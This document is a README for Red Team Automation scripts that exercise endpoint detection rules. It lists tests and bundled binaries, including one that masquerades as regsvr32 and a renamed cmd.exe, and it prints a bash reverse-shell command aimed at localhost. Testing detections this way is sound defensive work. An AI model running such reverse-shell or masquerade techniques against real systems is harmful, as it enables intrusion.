# Red Team Automation (RTA) scripts

This collection of RTA scripts can be used to trigger some Endpoint Behavior Protection rules on Windows, macOS, and Linux.

```console
(.venv) $ pwd
/Users/user1/Documents/GitHub/endpoint-rules
(.venv) $ python -m rta --help
usage: __main__.py [-h] [-n NAME] [-l]

optional arguments:
  -h, --help            show this help message and exit
  -n NAME, --name NAME  Name of test to execute. E.g. bitsadmin_execution
  -l, --list            Print a list of available tests
```

## Executables

For some tests, RTA scripts uses executables that are located in the `bin/` folder

* RegDoublePersist.exe - Adds and delete two entries in the `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\` registry, source code located in the `src/` folder
* regsvr32.exe - Fake regsvr32 that does an outbound connection to 8.8.8.8
* renamed.exe - Renamed cmd.exe, with the Original Filename Property tampered

## Listing available tests

```console
(.venv) $ python -m rta --list
Printing available tests
name                           | platforms
===============================================================
javascript_payload             | macos
reg_run_key_asterisk           | windows
inhibit_system_recovery        | windows
bitsadmin_execution            | windows
cmd_shell_via_word             | windows
modify_bootconf                | windows
process_name_masquerade        | windows
suspicious_office_child        | windows
reverse_shell                  | macos, linux
suspicious_powershell_download | windows
rundll32_inf                   | windows
plist_creation                 | macos
```

## Executing a test

```console
(.venv) $ python -m rta --name reverse_shell
[+] Executing command to simulate reverse shell execution
user1 @ MacBook-Pro.localdomain > "bash -c \"bash -i >/dev/tcp/127.0.0.1/4444\" 0>&1"
```